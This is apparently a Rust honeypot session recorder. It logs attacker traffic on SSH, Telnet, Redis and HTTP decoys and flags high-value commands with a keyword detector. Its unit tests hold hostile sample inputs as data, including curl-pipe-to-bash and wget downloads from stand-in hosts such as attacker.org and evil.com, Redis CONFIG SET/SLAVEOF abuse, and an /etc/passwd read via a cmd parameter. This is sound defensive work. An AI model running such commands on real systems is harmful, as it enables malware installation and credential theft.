use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{SystemTime, UNIX_EPOCH};

/// Returns current Unix timestamp in seconds.
fn current_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

/// Represents an individual interaction event within a honeypot session.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionEvent {
    pub timestamp: u64,
    pub direction: String,
    pub payload: String,
}

impl SessionEvent {
    pub fn new(timestamp: u64, direction: impl Into<String>, payload: impl Into<String>) -> Self {
        Self {
            timestamp,
            direction: direction.into(),
            payload: payload.into(),
        }
    }
}

/// Structured audit record representing the entirety of an interactive honeypot session.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionAudit {
    pub session_id: String,
    pub peer_ip: String,
    pub service: String,
    pub start_time: u64,
    pub events: Vec<SessionEvent>,
}

impl SessionAudit {
    pub fn new(
        session_id: impl Into<String>,
        peer_ip: impl Into<String>,
        service: impl Into<String>,
        start_time: u64,
    ) -> Self {
        Self {
            session_id: session_id.into(),
            peer_ip: peer_ip.into(),
            service: service.into(),
            start_time,
            events: Vec::new(),
        }
    }

    pub fn add_event(&mut self, event: SessionEvent) {
        self.events.push(event);
    }

    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string(self)
    }

    pub fn to_jsonl(&self) -> String {
        let mut out = String::new();
        for event in &self.events {
            if let Ok(line) = serde_json::to_string(event) {
                out.push_str(&line);
                out.push('\n');
            }
        }
        out
    }
}

/// Active honeypot session recorder and analyzer for SSH, Telnet, Redis, and HTTP traps.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SessionRecorder {
    sessions: HashMap<String, SessionAudit>,
}

impl SessionRecorder {
    pub fn new() -> Self {
        Self {
            sessions: HashMap::new(),
        }
    }

    pub fn start_session(&mut self, session_id: &str, peer_ip: &str, service: &str) {
        let audit = SessionAudit {
            session_id: session_id.to_string(),
            peer_ip: peer_ip.to_string(),
            service: service.to_string(),
            start_time: current_timestamp(),
            events: Vec::new(),
        };
        self.sessions.insert(session_id.to_string(), audit);
    }

    pub fn record_event(&mut self, session_id: &str, direction: &str, payload: &[u8]) {
        let payload_str = String::from_utf8_lossy(payload).into_owned();
        let event = SessionEvent {
            timestamp: current_timestamp(),
            direction: direction.to_uppercase(),
            payload: payload_str,
        };

        self.sessions
            .entry(session_id.to_string())
            .or_insert_with(|| SessionAudit {
                session_id: session_id.to_string(),
                peer_ip: "unknown".to_string(),
                service: "unknown".to_string(),
                start_time: current_timestamp(),
                events: Vec::new(),
            })
            .events
            .push(event);
    }

    pub fn get_session(&self, session_id: &str) -> Option<&SessionAudit> {
        self.sessions.get(session_id)
    }

    pub fn get_session_mut(&mut self, session_id: &str) -> Option<&mut SessionAudit> {
        self.sessions.get_mut(session_id)
    }

    pub fn all_sessions(&self) -> Vec<&SessionAudit> {
        self.sessions.values().collect()
    }

    pub fn end_session(&mut self, session_id: &str) -> Option<SessionAudit> {
        self.sessions.remove(session_id)
    }

    /// Extracts high-value attacker commands executed during the session (e.g. curl, wget, chmod, cat /etc/passwd, uname -a, id).
    pub fn extract_commands(&self, session_id: &str) -> Vec<String> {
        let session = match self.sessions.get(session_id) {
            Some(s) => s,
            None => return Vec::new(),
        };

        let mut commands = Vec::new();

        for event in &session.events {
            // Only inspect inbound attacker traffic
            if event.direction.eq_ignore_ascii_case("OUT") {
                continue;
            }

            let cleaned = clean_telnet(&event.payload);

            for raw_line in cleaned.lines() {
                let line = raw_line.trim();
                if line.is_empty() {
                    continue;
                }

                // Handle HTTP request payloads (e.g. GET /test?cmd=cat%20/etc/passwd HTTP/1.1)
                if line.starts_with("GET ")
                    || line.starts_with("POST ")
                    || line.starts_with("PUT ")
                    || line.starts_with("HEAD ")
                {
                    let decoded_line = percent_decode(line);
                    let mut found_http_cmd = false;

                    if let Some(query_start) = decoded_line.find('?') {
                        let query = &decoded_line[query_start + 1..];
                        let query_str = query.split_whitespace().next().unwrap_or(query);
                        for part in query_str.split('&') {
                            if let Some((k, v)) = part.split_once('=') {
                                let key_lower = k.to_ascii_lowercase();
                                if key_lower == "cmd"
                                    || key_lower == "exec"
                                    || key_lower == "command"
                                    || key_lower == "c"
                                {
                                    let v_trimmed = v.trim();
                                    if is_high_value_command(v_trimmed) {
                                        commands.push(v_trimmed.to_string());
                                        found_http_cmd = true;
                                    }
                                }
                            }
                        }
                    }

                    if !found_http_cmd {
                        for candidate in extract_candidate_commands(&decoded_line) {
                            if is_high_value_command(&candidate) {
                                commands.push(candidate);
                            }
                        }
                    }
                    continue;
                }

                // Process interactive shell, Telnet, SSH, and Redis commands
                let candidates = extract_candidate_commands(line);
                for candidate in candidates {
                    if is_high_value_command(&candidate) {
                        commands.push(candidate);
                    }
                }
            }
        }

        commands
    }

    /// Serializes session events into JSON Lines (JSONL) format.
    pub fn to_jsonl(&self, session_id: &str) -> Option<String> {
        let session = self.sessions.get(session_id)?;
        let mut out = String::new();
        for event in &session.events {
            if let Ok(line) = serde_json::to_string(event) {
                out.push_str(&line);
                out.push('\n');
            }
        }
        Some(out)
    }
}

/// Splits a compound command line on command separators (;, &&, ||) while preserving pipes and subcommands.
fn extract_candidate_commands(line: &str) -> Vec<String> {
    let delimiters = [";", "&&", "||"];
    let mut segments = vec![line.to_string()];

    for delim in delimiters {
        let mut next_segments = Vec::new();
        for seg in segments {
            for part in seg.split(delim) {
                let trimmed = part.trim();
                if !trimmed.is_empty() {
                    next_segments.push(trimmed.to_string());
                }
            }
        }
        segments = next_segments;
    }

    segments
}

/// Checks whether a given command candidate represents a high-value attacker command.
fn is_high_value_command(cmd: &str) -> bool {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return false;
    }

    let lower = trimmed.to_ascii_lowercase();

    // 1. Files / sensitive paths of interest (passwd, shadow)
    if lower.contains("/etc/passwd") || lower.contains("/etc/shadow") {
        return true;
    }

    // 2. uname / uname -a
    if lower == "uname" || lower.starts_with("uname ") || lower.contains("uname -a") {
        return true;
    }

    // 3. id / whoami
    if lower == "id"
        || lower.starts_with("id ")
        || lower == "whoami"
        || lower.starts_with("whoami ")
    {
        return true;
    }

    // 4. Download / exfiltration / staging: curl, wget
    if lower == "curl"
        || lower.starts_with("curl ")
        || lower.contains(" curl ")
        || lower.contains("$(curl ")
        || lower == "wget"
        || lower.starts_with("wget ")
        || lower.contains(" wget ")
        || lower.contains("$(wget ")
    {
        return true;
    }

    // 5. File permissions: chmod, chown
    if lower == "chmod"
        || lower.starts_with("chmod ")
        || lower.contains(" chmod ")
        || lower == "chown"
        || lower.starts_with("chown ")
    {
        return true;
    }

    // 6. Shells, privilege escalation, persistence, and destructive operations
    if lower.starts_with("bash ")
        || lower == "bash"
        || lower.starts_with("sh ")
        || lower == "sh"
        || lower.starts_with("nc ")
        || lower.starts_with("netcat ")
        || lower.starts_with("ncat ")
        || lower.starts_with("sudo ")
        || lower.starts_with("iptables ")
        || lower.contains("rm -rf")
        || lower.starts_with("crontab ")
        || lower == "crontab"
        || lower.starts_with("systemctl ")
        || lower.starts_with("service ")
        || lower.starts_with("kill ")
        || lower.starts_with("pkill ")
        || lower.starts_with("killall ")
        || lower.starts_with("insmod ")
        || lower.starts_with("modprobe ")
        || lower.starts_with("python ")
        || lower.starts_with("python3 ")
        || lower.starts_with("perl ")
        || lower.starts_with("busybox ")
    {
        return true;
    }

    // 7. Redis attack vectors
    if lower.starts_with("config set")
        || lower.starts_with("config get")
        || lower.starts_with("slaveof")
        || lower.starts_with("replicaof")
        || lower.starts_with("eval ")
    {
        return true;
    }

    false
}

/// Cleans Telnet IAC command sequences.
fn clean_telnet(payload: &str) -> String {
    let bytes = payload.as_bytes();
    let mut i = 0;
    let mut filtered = Vec::new();
    while i < bytes.len() {
        if bytes[i] == 0xFF {
            if i + 1 < bytes.len() && bytes[i + 1] >= 0xFA && bytes[i + 1] <= 0xFE {
                i += 3;
                continue;
            } else if i + 1 < bytes.len() && bytes[i + 1] == 0xFF {
                filtered.push(0xFF);
                i += 2;
                continue;
            } else {
                i += 2;
                continue;
            }
        }
        filtered.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&filtered).into_owned()
}

/// Percent-decodes URL query / form encoded values.
fn percent_decode(s: &str) -> String {
    let mut result = Vec::new();
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(byte) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                result.push(byte);
                i += 3;
                continue;
            }
        } else if bytes[i] == b'+' {
            result.push(b' ');
            i += 1;
            continue;
        }
        result.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&result).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_session_lifecycle() {
        let mut recorder = SessionRecorder::new();
        assert_eq!(recorder.all_sessions().len(), 0);

        // Start an SSH session
        let session_id = "sess-ssh-101";
        recorder.start_session(session_id, "192.168.1.50", "SSH");

        // Verify session metadata
        let session = recorder.get_session(session_id).expect("session should exist");
        assert_eq!(session.session_id, "sess-ssh-101");
        assert_eq!(session.peer_ip, "192.168.1.50");
        assert_eq!(session.service, "SSH");
        assert!(session.start_time > 0);
        assert_eq!(session.events.len(), 0);

        // Record events (IN and OUT)
        recorder.record_event(session_id, "IN", b"uname -a\n");
        recorder.record_event(session_id, "OUT", b"Linux decoy 5.15.0\n");
        recorder.record_event(session_id, "IN", b"id\n");
        recorder.record_event(session_id, "OUT", b"uid=0(root) gid=0(root)\n");

        let updated = recorder.get_session(session_id).unwrap();
        assert_eq!(updated.events.len(), 4);
        assert_eq!(updated.events[0].direction, "IN");
        assert_eq!(updated.events[0].payload, "uname -a\n");
        assert_eq!(updated.events[1].direction, "OUT");
        assert_eq!(updated.events[1].payload, "Linux decoy 5.15.0\n");
        assert_eq!(updated.events[2].direction, "IN");
        assert_eq!(updated.events[2].payload, "id\n");
        assert_eq!(updated.events[3].direction, "OUT");
        assert_eq!(updated.events[3].payload, "uid=0(root) gid=0(root)\n");

        // Non-existent session
        assert!(recorder.get_session("non-existent").is_none());

        // Multiple concurrent sessions (SSH, Telnet, Redis, HTTP)
        recorder.start_session("sess-telnet-1", "10.0.0.5", "Telnet");
        recorder.start_session("sess-redis-1", "10.0.0.6", "Redis");
        recorder.start_session("sess-http-1", "10.0.0.7", "HTTP");
        assert_eq!(recorder.all_sessions().len(), 4);

        // End session
        let removed = recorder.end_session("sess-ssh-101");
        assert!(removed.is_some());
        assert_eq!(recorder.all_sessions().len(), 3);
        assert!(recorder.get_session("sess-ssh-101").is_none());
    }

    #[test]
    fn test_command_extraction() {
        let mut recorder = SessionRecorder::new();
        let session_id = "sess-attack-1";
        recorder.start_session(session_id, "185.220.101.5", "SSH");

        // Record high-value commands
        recorder.record_event(session_id, "IN", b"uname -a\n");
        recorder.record_event(session_id, "OUT", b"Linux sentinela 6.1.0-21-amd64\n");
        recorder.record_event(session_id, "IN", b"id\n");
        recorder.record_event(session_id, "OUT", b"uid=0(root) gid=0(root)\n");
        recorder.record_event(session_id, "IN", b"cat /etc/passwd\n");
        recorder.record_event(
            session_id,
            "IN",
            b"curl -fsSL http://attacker.org/miner.sh | bash\n",
        );
        recorder.record_event(session_id, "IN", b"wget http://attacker.org/bot -O /tmp/bot\n");
        recorder.record_event(session_id, "IN", b"chmod +x /tmp/bot\n");

        // Benign noise commands that should NOT be extracted as high-value
        recorder.record_event(session_id, "IN", b"ls -la\n");
        recorder.record_event(session_id, "IN", b"pwd\n");
        recorder.record_event(session_id, "IN", b"cd /tmp\n");

        let cmds = recorder.extract_commands(session_id);

        // Assert high-value commands are extracted
        assert!(
            cmds.iter().any(|c| c.contains("uname -a")),
            "uname -a should be extracted"
        );
        assert!(
            cmds.iter().any(|c| c == "id" || c.starts_with("id ")),
            "id should be extracted"
        );
        assert!(
            cmds.iter().any(|c| c.contains("cat /etc/passwd")),
            "cat /etc/passwd should be extracted"
        );
        assert!(
            cmds.iter().any(|c| c.contains("curl")),
            "curl command should be extracted"
        );
        assert!(
            cmds.iter().any(|c| c.contains("wget")),
            "wget command should be extracted"
        );
        assert!(
            cmds.iter().any(|c| c.contains("chmod")),
            "chmod command should be extracted"
        );

        // Assert noise is excluded
        assert!(
            !cmds.iter().any(|c| c == "ls -la"),
            "ls -la should not be in high-value commands"
        );
        assert!(
            !cmds.iter().any(|c| c == "pwd"),
            "pwd should not be in high-value commands"
        );
        assert!(
            !cmds.iter().any(|c| c == "cd /tmp"),
            "cd /tmp should not be in high-value commands"
        );

        // Assert decoy outputs (OUT events) are not extracted as commands
        assert!(
            !cmds.iter().any(|c| c.contains("uid=0(root)")),
            "decoy output should not be extracted"
        );

        // Test compound command extraction (wget && chmod)
        let comp_id = "sess-compound";
        recorder.start_session(comp_id, "185.220.101.6", "SSH");
        recorder.record_event(comp_id, "IN", b"wget http://evil.com/x && chmod 777 x\n");
        let comp_cmds = recorder.extract_commands(comp_id);
        assert!(comp_cmds.iter().any(|c| c.contains("wget")));
        assert!(comp_cmds.iter().any(|c| c.contains("chmod")));

        // Test Redis attack commands
        let redis_id = "sess-redis";
        recorder.start_session(redis_id, "185.220.101.7", "Redis");
        recorder.record_event(redis_id, "IN", b"CONFIG SET dir /var/spool/cron\r\n");
        recorder.record_event(redis_id, "IN", b"SLAVEOF 1.2.3.4 6379\r\n");
        let redis_cmds = recorder.extract_commands(redis_id);
        assert!(redis_cmds.iter().any(|c| c.contains("CONFIG SET")));
        assert!(redis_cmds.iter().any(|c| c.contains("SLAVEOF")));

        // Test HTTP web decoy probe extraction
        let http_id = "sess-http";
        recorder.start_session(http_id, "185.220.101.8", "HTTP");
        recorder.record_event(
            http_id,
            "IN",
            b"GET /vulnerable.php?cmd=cat%20/etc/passwd HTTP/1.1\r\nHost: test\r\n\r\n",
        );
        let http_cmds = recorder.extract_commands(http_id);
        assert!(http_cmds.iter().any(|c| c.contains("cat /etc/passwd")));

        // Test non-existent session
        assert!(recorder.extract_commands("does-not-exist").is_empty());
    }

    #[test]
    fn test_jsonl_serialization() {
        let mut recorder = SessionRecorder::new();
        let session_id = "sess-jsonl-1";

        // Non-existent session returns None
        assert!(recorder.to_jsonl("non-existent").is_none());

        // Empty session returns Some("")
        recorder.start_session(session_id, "10.10.10.10", "Telnet");
        let empty_jsonl = recorder.to_jsonl(session_id);
        assert_eq!(empty_jsonl, Some("".to_string()));

        // Record events
        recorder.record_event(session_id, "IN", b"admin\r\n");
        recorder.record_event(session_id, "OUT", b"Password: ");
        recorder.record_event(session_id, "IN", b"123456\r\n");
        recorder.record_event(session_id, "OUT", b"Login incorrect\r\n");

        let jsonl_str = recorder.to_jsonl(session_id).expect("should produce JSONL string");
        let lines: Vec<&str> = jsonl_str.lines().collect();
        assert_eq!(lines.len(), 4);

        // Verify each line is valid JSON deserializable into SessionEvent
        for (i, line) in lines.iter().enumerate() {
            let event: SessionEvent =
                serde_json::from_str(line).expect("each line must be a valid SessionEvent");
            assert!(event.timestamp > 0);
            match i {
                0 => {
                    assert_eq!(event.direction, "IN");
                    assert_eq!(event.payload, "admin\r\n");
                }
                1 => {
                    assert_eq!(event.direction, "OUT");
                    assert_eq!(event.payload, "Password: ");
                }
                2 => {
                    assert_eq!(event.direction, "IN");
                    assert_eq!(event.payload, "123456\r\n");
                }
                3 => {
                    assert_eq!(event.direction, "OUT");
                    assert_eq!(event.payload, "Login incorrect\r\n");
                }
                _ => unreachable!(),
            }
        }

        // Also verify SessionAudit JSON serialization
        let session = recorder.get_session(session_id).unwrap();
        let audit_json = session.to_json().expect("SessionAudit serialization should succeed");
        let deserialized_audit: SessionAudit =
            serde_json::from_str(&audit_json).expect("SessionAudit deserialization should succeed");
        assert_eq!(deserialized_audit.session_id, "sess-jsonl-1");
        assert_eq!(deserialized_audit.peer_ip, "10.10.10.10");
        assert_eq!(deserialized_audit.service, "Telnet");
        assert_eq!(deserialized_audit.events.len(), 4);
    }
}
